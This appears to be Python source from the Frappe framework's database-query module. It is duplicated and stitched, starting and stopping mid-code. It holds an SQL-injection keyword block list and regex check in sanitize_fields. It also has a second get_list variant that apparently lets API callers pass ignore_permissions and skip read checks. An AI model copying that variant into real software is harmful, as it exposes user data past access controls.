			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)

	# If doctype is child table
	if frappe.is_table(doctype):
		# Example frappe.db.get_list('Purchase Receipt Item', {'parent': 'Purchase Receipt'})
		# Here purchase receipt is the parent doctype of the child doctype Purchase Receipt Item

		if not kwargs.get('parent'):
			frappe.flags.error_message = _('Parent is required to get child table data')
			raise frappe.PermissionError(doctype)

		check_parent_permission(kwargs.get('parent'), doctype)
		del kwargs['parent']

	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)                    

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
